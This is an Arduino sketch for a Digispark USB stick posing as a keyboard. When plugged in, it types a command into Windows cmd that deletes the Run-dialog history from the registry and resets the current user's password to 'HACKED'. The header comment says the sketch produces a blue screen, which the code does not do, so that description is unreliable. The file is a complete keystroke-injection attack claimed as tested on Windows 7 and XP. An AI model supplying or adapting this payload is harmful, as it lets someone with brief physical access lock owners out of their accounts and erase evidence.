//This DigiKeyboard performance a blue screen through Windows CMD
//on Windows 7 and Windows XP. It has been tested successfully

#include "DigiKeyboard.h"

void setup() 
{
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(200);
  //open cmd
  DigiKeyboard.println("CMD.EXE /C REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&NET USER %USERNAME% HACKED&EXIT");
}

void loop()
{
  //empty
}
